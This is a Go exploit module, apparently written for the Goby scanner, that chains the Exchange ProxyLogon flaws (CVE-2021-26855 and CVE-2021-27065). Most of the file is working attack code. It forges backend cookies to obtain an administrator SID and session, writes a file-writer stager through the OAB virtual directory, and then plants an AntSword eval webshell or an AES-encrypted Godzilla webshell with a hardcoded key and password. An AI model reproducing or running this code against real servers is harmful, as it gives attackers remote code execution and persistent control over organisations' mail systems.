package exploits

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Exchange Server file upload vulnerability (CVE-2021-27065/CVE-2021-26855)",
    "Description": "<p>Microsoft Exchange Server is an email service program developed by Microsoft in the United States. It provides functions such as email access, storage, forwarding, voice mail, and email filtering and filtering.</p><p>There is a vulnerability in Exchange for arbitrary file writing after authentication. After authentication through the Exchange server, attackers can exploit this vulnerability to write files to any path on the server. This vulnerability can be combined with the CVE-2021-26855 SSRF vulnerability for combined attacks.</p>",
    "Product": "Microsoft-Exchange",
    "Homepage": "https://www.microsoft.com/zh-cn/",
    "DisclosureDate": "2021-03-02",
    "PostTime": "2023-12-08",
    "Author": "keeeee",
    "FofaQuery": "banner=\"Microsoft ESMTP MAIL Service\" || banner=\"Microsoft Exchange Server\" || banner=\"Microsoft Exchange Internet Mail Service\" || banner=\"Microsoft SMTP MAIL\" || banner=\"Microsoft Exchange\" || (banner=\"owa\" && banner=\"Location\" && cert!=\"Technicolor\") || banner=\"Set-Cookie: OutlookSession\" || (((header=\"owa\" && (header=\"Location\" || header=\"X-Owa-Version\" || header=\"Set-Cookie: OWA-COOKIE\")) || (body=\"href=\\\"/owa/auth/\" && (title=\"Outlook\" || title=\"Exchange \" || body=\"var a_sLgn\" || body=\"aria-label=\\\"Outlook Web App\\\" class=\\\"signInImageHeader\"))) && header!=\"WordPress\" && body!=\"wp-content\" && body!=\"wp-includes\") || body=\"<!-- owapage = ASP.auth_logon_aspx\" || header=\"x-owa-version\" || body=\"window.location.replace(\\\"/owa/\\\" + window.location.hash);</script></head><body></body>\" || body=\"<meta http-equiv=\\\"Refresh\\\" contect=\\\"0;url=/owa\\\">\" || body=\"themes/resources/segoeui-semibold.ttf\" || title==\"Microsoft Outlook Web Access\" || body=\"aria-label=\\\"Outlook Web App\" || title=\"Outlook Web Access\" || header=\"OutlookSession\" || (body=\".mouse .owaLogoContainer, .twide .owaLogoContainer\" && body=\"owaLogoContainer\") || (body=\"<div class=\\\"signInHeader\\\">Outlook</div>\" && body=\"/owa/\") || (body=\"owapage = ASP.auth_logon_aspx\" && body=\"/owa/\" && (body=\"showPasswordCheck\" || body=\"Outlook\")) || (title=\"Outlook Web App\" && body=\"Microsoft Corporation\") || header=\"realm=\\\"Outlook Web App\" || ((body=\"使用 Outlook Web App \" || body=\" use Outlook Web App\") && body=\"Microsoft Corporation\")",
    "GobyQuery": "banner=\"Microsoft ESMTP MAIL Service\" || banner=\"Microsoft Exchange Server\" || banner=\"Microsoft Exchange Internet Mail Service\" || banner=\"Microsoft SMTP MAIL\" || banner=\"Microsoft Exchange\" || (banner=\"owa\" && banner=\"Location\" && cert!=\"Technicolor\") || banner=\"Set-Cookie: OutlookSession\" || (((header=\"owa\" && (header=\"Location\" || header=\"X-Owa-Version\" || header=\"Set-Cookie: OWA-COOKIE\")) || (body=\"href=\\\"/owa/auth/\" && (title=\"Outlook\" || title=\"Exchange \" || body=\"var a_sLgn\" || body=\"aria-label=\\\"Outlook Web App\\\" class=\\\"signInImageHeader\"))) && header!=\"WordPress\" && body!=\"wp-content\" && body!=\"wp-includes\") || body=\"<!-- owapage = ASP.auth_logon_aspx\" || header=\"x-owa-version\" || body=\"window.location.replace(\\\"/owa/\\\" + window.location.hash);</script></head><body></body>\" || body=\"<meta http-equiv=\\\"Refresh\\\" contect=\\\"0;url=/owa\\\">\" || body=\"themes/resources/segoeui-semibold.ttf\" || title==\"Microsoft Outlook Web Access\" || body=\"aria-label=\\\"Outlook Web App\" || title=\"Outlook Web Access\" || header=\"OutlookSession\" || (body=\".mouse .owaLogoContainer, .twide .owaLogoContainer\" && body=\"owaLogoContainer\") || (body=\"<div class=\\\"signInHeader\\\">Outlook</div>\" && body=\"/owa/\") || (body=\"owapage = ASP.auth_logon_aspx\" && body=\"/owa/\" && (body=\"showPasswordCheck\" || body=\"Outlook\")) || (title=\"Outlook Web App\" && body=\"Microsoft Corporation\") || header=\"realm=\\\"Outlook Web App\" || ((body=\"使用 Outlook Web App \" || body=\" use Outlook Web App\") && body=\"Microsoft Corporation\")",
    "Level": "3",
    "Impact": "<p><a href=\"https://fanyi.baidu.com/?aldtype=16047###\"></a><a></a></p><p>There is a file write vulnerability in Microsoft Exchange Server, which allows attackers to execute arbitrary code on the server side, gain server privileges, and gain control over the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix program, please keep an eye on the updates: <a href=\"https://msrc.microsoft.com/update-guide/zh-cn/vulnerability/CVE-2021-27065\">https://msrc.microsoft.com/update-guide/zh-cn/vulnerability/CVE-2021-27065</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "godzilla,antSword,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "hello.aspx",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<%@ Page Language=\"C#\" %><%= \"Hello, World!\" %>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "contEnt": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "Server-Side Request Forgery"
    ],
    "VulType": [
        "File Upload",
        "Server-Side Request Forgery"
    ],
    "CVEIDs": [
        "CVE-2021-27065",
        "CVE-2021-26855"
    ],
    "CNNVD": [
        "CNNVD-202103-188",
        "CNNVD-202103-192"
    ],
    "CNVD": [
        "CNVD-2021-14810",
        "CNVD-2021-14813"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Exchange Server 文件上传漏洞 (CVE-2021-27065/CVE-2021-26855)",
            "Product": "Microsoft-Exchange",
            "Description": "<p>Microsoft Exchange Server 是美国微软(Microsoft)公司的一套电子邮件服务程序。它提供邮件存取、储存、转发，语音邮件，邮件过滤筛选等功能。<br></p><p>Exchange 中存在身份验证后的任意文件上传漏洞。攻击者通过Exchange服务器进行身份验证后，可以利用此漏洞将文件写入服务器上的任何路径。该漏洞可以配合CVE-2021-26855 SSRF漏洞进行组合攻击。</p>",
            "Recommendation": "<p>1、厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://msrc.microsoft.com/update-guide/zh-cn/vulnerability/CVE-2021-27065\">https://msrc.microsoft.com/update-guide/zh-cn/vulnerability/CVE-2021-27065</a></p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Microsoft Exchange Server 存在文件上传漏洞，攻击者可通过该漏洞，在服务器端写⼊后⻔，从而执行任意代码，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "VulType": [
                "文件上传",
                "服务器端请求伪造"
            ],
            "Tags": [
                "文件上传",
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "Exchange Server file upload vulnerability (CVE-2021-27065/CVE-2021-26855)",
            "Product": "Microsoft-Exchange",
            "Description": "<p>Microsoft Exchange Server is an email service program developed by Microsoft in the United States. It provides functions such as email access, storage, forwarding, voice mail, and email filtering and filtering.</p><p>There is a vulnerability in Exchange for arbitrary file writing after authentication. After authentication through the Exchange server, attackers can exploit this vulnerability to write files to any path on the server. This vulnerability can be combined with the CVE-2021-26855 SSRF vulnerability for combined attacks.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix program, please keep an eye on the updates: <a href=\"https://msrc.microsoft.com/update-guide/zh-cn/vulnerability/CVE-2021-27065\">https://msrc.microsoft.com/update-guide/zh-cn/vulnerability/CVE-2021-27065</a><br></p>",
            "Impact": "<p><a href=\"https://fanyi.baidu.com/?aldtype=16047###\"></a><a></a></p><p>There is a file write vulnerability in Microsoft Exchange Server, which allows attackers to execute arbitrary code on the server side, gain server privileges, and gain control over the entire web server.</p>",
            "VulType": [
                "File Upload",
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "File Upload",
                "Server-Side Request Forgery"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10893"
}`
	unPackInt001 := func(data string) int {
		var i int
		if len(data) == 2 {
			i = int(binary.LittleEndian.Uint16([]byte(data)))
		} else if len(data) == 4 {
			i = int(binary.LittleEndian.Uint32([]byte(data)))
		}
		return i
	}

	unPackStr001 := func(byte_string []byte) string {
		return string(bytes.Replace(byte_string, []byte("\x00"), []byte(""), -1))
	}

	parseChallenge001 := func(auth string) (string, string, error) {
		targetInfoField := auth[40:48]
		targetInfoIen := unPackInt001(targetInfoField[0:2])
		targetinfoOffset := unPackInt001(targetInfoField[4:8])
		targetInfoBytes := auth[targetinfoOffset : targetinfoOffset+targetInfoIen]
		domainName := ""
		computerName := ""
		infoOffset := 0
		for infoOffset < len(targetInfoBytes) {
			avId := unPackInt001(targetInfoBytes[infoOffset : infoOffset+2])
			avLen := unPackInt001(targetInfoBytes[infoOffset+2 : infoOffset+4])
			avValue := targetInfoBytes[infoOffset+4 : infoOffset+4+avLen]
			infoOffset = infoOffset + 4 + avLen
			if avId == 2 {
				domainName = unPackStr001([]byte(avValue)) // MsvAvDnsDomainName
			} else if avId == 3 {
				computerName = unPackStr001([]byte(avValue)) // MsvAvDnsComputerName
			}
		}
		domainName = computerName[strings.Index(computerName, ".")+1:]
		return computerName, domainName, nil
	}

	//获取主机名和邮箱
	ntlMinfo2001 := func(targetUrl *httpclient.FixUrl) (string, string, error) {
		getHostConfig := httpclient.NewGetRequestConfig("/rpc/")
		getHostConfig.Timeout = 13
		getHostConfig.VerifyTls = false
		getHostConfig.FollowRedirect = false
		getHostConfig.Header.Store("Authorization", fmt.Sprintf("Negotiate %s", "TlRMTVNTUAABAAAAl4II4gAAAAAAAAAAAAAAAAAAAAAKALpHAAAADw=="))
		resp, err := httpclient.DoHttpRequest(targetUrl, getHostConfig)
		if resp != nil {
			authHeader := resp.Response.Header.Get("WWW-Authenticate")
			reg := regexp.MustCompile(`Negotiate ([A-Za-z0-9/+=]+)`)
			res := reg.FindStringSubmatch(authHeader)
			if len(res) > 1 && res[1] != "" {
				if bs, err := base64.StdEncoding.DecodeString(res[1]); bs != nil {
					return parseChallenge001(string(bs))
				} else if err != nil {
					return "", "", err
				}
			}
		} else if err != nil {
			return "", "", err
		}
		return "", err.Error(), errors.New("漏洞利用失败")
	}

	// 获取 Sid
	getSidFlagTuLLtV := func(hostInfo *httpclient.FixUrl, fqnd, domain, randomName string) (string, error) {
		//获取LegacyDN
		fqnRequestConfig := httpclient.NewPostRequestConfig("/ecp/" + randomName + ".js")
		fqnRequestConfig.Header.Store("contEnt-Type", "text/xml")
		fqnRequestConfig.Header.Store("Cookie", "X-BEResource="+fqnd+"/autodiscover/autodiscover.xml?a=~1942062522")
		//fqnRequestConfig.Timeout = 13
		fqnRequestConfig.VerifyTls = false
		fqnRequestConfig.FollowRedirect = false
		fqnRequestConfig.Data = "<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\">\n    <Request>\n      <EMailAddress>administrator@" + domain + "</EMailAddress>\n      <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>\n    </Request>\n</Autodiscover>"
		legacyDNResp, legacyDNErr := httpclient.DoHttpRequest(hostInfo, fqnRequestConfig)
		reg := regexp.MustCompile(`<LegacyDN>(.*?)</LegacyDN>`)
		if legacyDNResp == nil && legacyDNErr != nil {
			return "", legacyDNErr
		} else if len(reg.FindStringSubmatch(legacyDNResp.RawBody)) < 1 {
			return "", errors.New("漏洞利用失败")
		}
		legacyDN := reg.FindStringSubmatch(legacyDNResp.RawBody)[1]
		//获取SID
		payload := legacyDN + "\x00\x00\x00\x00\x00\x20\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
		getSIDRequestConfig := httpclient.NewPostRequestConfig(fmt.Sprintf("/ecp/%s.js", randomName))
		getSIDRequestConfig.Header.Store("X-Clientapplication", "Outlook/15.0.4815.1002")
		getSIDRequestConfig.Header.Store("X-Requestid", "x")
		getSIDRequestConfig.Header.Store("X-Requesttype", "Connect")
		getSIDRequestConfig.Header.Store("contEnt-Type", "application/mapi-http")
		getSIDRequestConfig.Header.Store("Cookie", fmt.Sprintf("%sX-BEResource=admin]@%s:444%s?%s#~1941962753", "", fqnd, "/mapi/emsmdb/", ""))
		getSIDRequestConfig.Timeout = 13
		getSIDRequestConfig.Data = payload
		getSIDRequestConfig.VerifyTls = false
		getSIDRequestConfig.FollowRedirect = false
		getSIDRequestConfig.Header.Store("msExchLogonMailbox", "S-1-5-20")
		sidRegexp := regexp.MustCompile(`with SID ([S\-0-9]+) `)
		for i := 0; i < 2; i++ {
			sidResp, sidErr := httpclient.DoHttpRequest(hostInfo, getSIDRequestConfig)
			if sidErr != nil && sidResp == nil {
				return "", sidErr
			} else if len(sidRegexp.FindStringSubmatch(sidResp.RawBody)) > 1 {
				sid := sidRegexp.FindStringSubmatch(sidResp.RawBody)[1]
				//判断SID获取
				ss := strings.Split(sid, "-")
				sid = strings.Replace(sid, ss[len(ss)-1], "500", -1)
				return sid, nil
			}
		}
		return "", errors.New("漏洞利用失败")
	}
	//获取sessionID，Canary
	getSessionIdAndCanaryFlagTuLLtV := func(hostInfo *httpclient.FixUrl, fqnd string, randomName string, sid string) (string, string, error) {
		sendSessionID := httpclient.NewPostRequestConfig("/ecp/" + randomName + ".js")
		sendSessionID.Header.Store("Cookie", "X-BEResource=admin]@"+fqnd+":444/ecp/proxyLogon.ecp?#~1941962753;")
		sendSessionID.Header.Store("Msexchlogonmailbox", "S-1-5-20")
		sendSessionID.Header.Store("contEnt-Type", "application/json")
		sendSessionID.Data = "<r at=\"NTLM\" ln=\"administrator\"><s t=\"0\">" + sid + "</s></r>"
		sendSessionID.Timeout = 13
		sendSessionID.VerifyTls = false
		sendSessionID.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, sendSessionID)
		sessionIdRegex := regexp.MustCompile(`ASP\.NET_SessionId=(.*?);`)
		canaryRegex := regexp.MustCompile(`msExchEcpCanary=(.*?);`)
		if resp == nil && err != nil {
			return "", "", err
		} else if resp != nil && resp.StatusCode == 241 && len(sessionIdRegex.FindStringSubmatch(resp.Cookie)) > 1 && len(canaryRegex.FindStringSubmatch(resp.Cookie)) > 1 {
			return sessionIdRegex.FindStringSubmatch(resp.Cookie)[1], canaryRegex.FindStringSubmatch(resp.Cookie)[1], err
		}
		return "", "", errors.New("漏洞利用失败")
	}

	// 获取RawIdentity
	getRawIdentityFlagFfQwDs := func(hostInfo *httpclient.FixUrl, fqnd, randomName, sessionID, canary string) (string, error) {
		rawIdentityRequestConfig := httpclient.NewPostRequestConfig("/ecp/" + randomName + ".js")
		rawIdentityRequestConfig.Header.Store("Cookie", "X-BEResource=admin]@"+fqnd+":444/ecp/DDI/DDIService.svc/GetObject?msExchEcpCanary="+canary+"&schema=OABVirtualDirectory#~1941962753;msExchEcpCanary="+canary+";ASP.NET_SessionId="+sessionID+";")
		rawIdentityRequestConfig.Header.Store("Msexchlogonmailbox", "S-1-5-20")
		rawIdentityRequestConfig.VerifyTls = false
		rawIdentityRequestConfig.FollowRedirect = false
		rawIdentityRequestConfig.Timeout = 13
		rawIdentityResp, err := httpclient.DoHttpRequest(hostInfo, rawIdentityRequestConfig)
		if rawIdentityResp == nil && err != nil {
			return "", err
		} else if rawIdentityResp != nil && rawIdentityResp.StatusCode == 200 && len(strings.Split(rawIdentityResp.RawBody, "\"RawIdentity\":\"")) > 1 {
			return strings.Split(strings.Split(rawIdentityResp.RawBody, "\"RawIdentity\":\"")[1], "\"")[0], nil
		}
		return "", errors.New("漏洞利用失败")
	}

	resetVerticalPathFlagFO22bf := func(hostInfo *httpclient.FixUrl, fqnd string, randomName string, sessionID string, canary string, rawIdentity string) (*httpclient.HttpResponse, error) {
		//重置虚拟目录
		sendConfResetting := httpclient.NewPostRequestConfig("/ecp/" + randomName + ".js")
		sendConfResetting.Header.Store("Cookie", "ASP.NET_SessionId="+sessionID+";msExchEcpCanary="+canary+";X-BEResource=admin]@"+fqnd+":444/ecp/DDI/DDIService.svc/SetObject?msExchEcpCanary="+canary+"&schema=OABVirtualDirectory#~1941962753;")
		sendConfResetting.Header.Store("Msexchlogonmailbox", "S-1-5-20")
		sendConfResetting.Header.Store("contEnt-Type", "application/json")
		sendConfResetting.VerifyTls = false
		sendConfResetting.FollowRedirect = false
		sendConfResetting.Data = "{\"properties\": {\"Parameters\": {\"ExternalUrl\": \"\", \"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\"}}, \"identity\": {\"DisplayName\": \"OAB (Default Web Site)\", \"__type\": \"Identity:ECP\", \"RawIdentity\":  \"" + rawIdentity + "\"}}"
		return httpclient.DoHttpRequest(hostInfo, sendConfResetting)
	}

	// 设置虚拟目录映射关系
	setVerticalPathFlagFO22bf := func(hostInfo *httpclient.FixUrl, fqnd string, randomName string, sessionID string, canary string, rawIdentity string, filePath string) (*httpclient.HttpResponse, error) {
		//写入文件位置
		setVerticalPathRequestConfig := httpclient.NewPostRequestConfig("/ecp/" + randomName + ".js")
		setVerticalPathRequestConfig.Header.Store("Cookie", "ASP.NET_SessionId="+sessionID+";msExchEcpCanary="+canary+";X-BEResource=admin]@"+fqnd+":444/ecp/DDI/DDIService.svc/SetObject?msExchEcpCanary="+canary+"&schema=ResetOABVirtualDirectory#~1941962753;")
		setVerticalPathRequestConfig.Header.Store("Msexchlogonmailbox", "S-1-5-20")
		setVerticalPathRequestConfig.Header.Store("contEnt-Type", "application/json")
		setVerticalPathRequestConfig.VerifyTls = false
		setVerticalPathRequestConfig.FollowRedirect = false
		setVerticalPathRequestConfig.Data = "{\"properties\": {\"Parameters\": {\"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\", \"filePathName\": \"" + filePath + "\"}}, \"identity\": {\"DisplayName\": \"OAB (Default Web Site)\", \"__type\": \"Identity:ECP\", \"RawIdentity\": \"" + rawIdentity + "\"}}"
		setVerticalPathResp, err := httpclient.DoHttpRequest(hostInfo, setVerticalPathRequestConfig)
		if setVerticalPathResp == nil && err != nil {
			return nil, err
		} else if setVerticalPathResp.StatusCode != 200 {
			return nil, errors.New("漏洞利用失败")
		}
		return resetVerticalPathFlagFO22bf(hostInfo, fqnd, randomName, sessionID, canary, rawIdentity)
	}

	checkFileFlagQ2qGZf := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		checkRequestConfig := httpclient.NewGetRequestConfig("/aspnet_client/" + filename)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		for i := 0; i < 10; i++ {
			checkResp, err := httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
			if checkResp == nil && err != nil {
				return nil, err
			} else if checkResp.StatusCode == 200 || checkResp.StatusCode == 500 {
				return checkResp, nil
			}
			time.Sleep(3 * time.Second)
		}
		return nil, errors.New("漏洞利用失败")
	}

	// 传入小马写大马
	fileUploadFlagQ2qGZf := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		sendConfigWritingHorses := httpclient.NewPostRequestConfig("/aspnet_client/fileqwe123.aspx")
		sendConfigWritingHorses.Header.Store("contEnt-Type", "application/x-www-form-urlencoded")
		sendConfigWritingHorses.Data = "filename=" + "../../../../../../inetpub/wwwroot/aspnet_client/" + filename + "&content=" + url.QueryEscape(content)
		sendConfigWritingHorses.VerifyTls = false
		sendConfigWritingHorses.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, sendConfigWritingHorses)
		if resp == nil && err != nil {
			return nil, err
		} else if resp.StatusCode == 200 {
			return checkFileFlagQ2qGZf(hostInfo, filename)
		}
		return nil, errors.New("漏洞利用失败")
	}

	// 文件上传
	uploadFlagQ2qGZf := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		fqnd, domain, err := ntlMinfo2001(hostInfo)
		randomName := goutils.RandomHexString(3)
		if (len(fqnd) == 0 || len(domain) == 0) && err != nil {
			return nil, err
		}
		sid, err := getSidFlagTuLLtV(hostInfo, fqnd, domain, randomName)
		if err != nil {
			return nil, err
		}
		sessionId, canary, err := getSessionIdAndCanaryFlagTuLLtV(hostInfo, fqnd, fqnd, sid)
		if err != nil {
			return nil, err
		}
		rawIdentity, err := getRawIdentityFlagFfQwDs(hostInfo, fqnd, randomName, sessionId, canary)
		if err != nil {
			return nil, err
		}
		// 写入木马
		uploadRequestConfig := httpclient.NewPostRequestConfig("/ecp/" + randomName + ".js")
		uploadRequestConfig.Header.Store("Cookie", "X-BEResource=admin]@"+fqnd+":444/ecp/DDI/DDIService.svc/SetObject?msExchEcpCanary="+canary+"&schema=OABVirtualDirectory#~1941962753;msExchEcpCanary="+canary+";ASP.NET_SessionId="+sessionId+";")
		uploadRequestConfig.Header.Store("Msexchlogonmailbox", "S-1-5-20")
		uploadRequestConfig.Header.Store("contEnt-Type", "application/json")
		uploadRequestConfig.Data = "{\"properties\": {\"Parameters\": {\"ExternalUrl\": \"" + content + "\", \"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\"}}, \"identity\": {\"DisplayName\": \"OAB (Default Web Site)\", \"__type\": \"Identity:ECP\", \"RawIdentity\": \"" + rawIdentity + "\"}}"
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		uploadResp, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig)
		if uploadResp == nil && err != nil {
			return nil, err
		} else if uploadResp.StatusCode != 200 {
			return nil, errors.New("漏洞利用失败")
		}
		// 虚拟位置
		filePath := "\\\\\\\\127.0.0.1\\\\C$\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\" + filename
		if setVerticalPathResp, err := setVerticalPathFlagFO22bf(hostInfo, fqnd, randomName, sessionId, canary, rawIdentity, filePath); setVerticalPathResp == nil && err != nil {
			return nil, err
		} else if setVerticalPathResp.StatusCode != 200 {
			return nil, errors.New("漏洞利用失败")
		}
		return checkFileFlagQ2qGZf(hostInfo, filename)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			filename := goutils.RandomHexString(3) + ".aspx"
			content := "http://f/<script language=\\\"C#\\\" runat=\\\"server\\\">void Page_Load(object sender, EventArgs e){Response.Write(\\\"" + checkStr + "\\\");System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));}</script>"
			resp, _ := uploadFlagQ2qGZf(hostInfo, filename, content)
			return resp != nil && strings.Contains(resp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			var content string
			filename := goutils.RandomHexString(3) + ".aspx"
			if attackType == "antSword" {
				content = `http://f/<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request[\"pass\"],\"unsafe\");}</script>`
				if resp, err := uploadFlagQ2qGZf(expResult.HostInfo, filename, content); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
					expResult.Output += "Password: pass\n"
					expResult.Output += "WebShell tool: Antsword v4.0\n"
					expResult.Output += "连接时勾选忽略 https 证书选项\n"
					return expResult
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
				return expResult
			} else if attackType == "godzilla" {
				content = `<%@ Page Language="C#"%><%try {     string key = "3c6e0b8a9c15224a";     string pass = "pass";     string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", "");     byte[] data = System.Convert.FromBase64String(Context.Request[pass]);     data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);         if (Application["payload"] == null)     {         Application["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });     }     else     {         System.IO.MemoryStream outStream = new System.IO.MemoryStream();         object o = ((System.Reflection.Assembly)Application["payload"]).CreateInstance("LY");         o.Equals(Context);         o.Equals(outStream);         o.Equals(data);         o.ToString();         byte[] r = outStream.ToArray();         Context.Response.Write(md5.Substring(0, 16));         Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)));         Context.Response.Write(md5.Substring(16));     } } catch (System.Exception) { }%>`
			} else if attackType == "custom" {
				filename = goutils.B2S(ss.Params["filename"])
				content = goutils.B2S(ss.Params["content"])
			} else {
				expResult.Success = false
				expResult.Output = `未知的的利用方式`
				return expResult
			}
			checkRequestConfig := httpclient.NewPostRequestConfig("/aspnet_client/fileqwe123.aspx")
			checkRequestConfig.Header.Store("contEnt-Type", "application/x-www-form-urlencoded")
			checkRequestConfig.Data = `filename=1.txt&content=1`
			checkRequestConfig.VerifyTls = false
			checkRequestConfig.FollowRedirect = false
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, checkRequestConfig)
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			} else if resp != nil && resp.StatusCode != 200 {
				payload := "http://f/<script language=\\\"JScript\\\" runat=\\\"server\\\">function Page_Load(){var file = new ActiveXObject(\\\"Scripting.FileSystemObject\\\").CreateTextFile(Request[\\\"filename\\\"], true);file.WriteLine(Request[\\\"content\\\"]);file.Close();}</script>"
				resp, err := uploadFlagQ2qGZf(expResult.HostInfo, `fileqwe123.aspx`, payload)
				if resp == nil && err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if resp.StatusCode != 200 {
					expResult.Output = `漏洞利用失败`
					return expResult
				}
			}
			if resp, err := fileUploadFlagQ2qGZf(expResult.HostInfo, filename, content); resp != nil && resp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
				if attackType == "godzilla" {
					expResult.Output += "Password: pass 加密器：CSHAP_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: aspx"
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
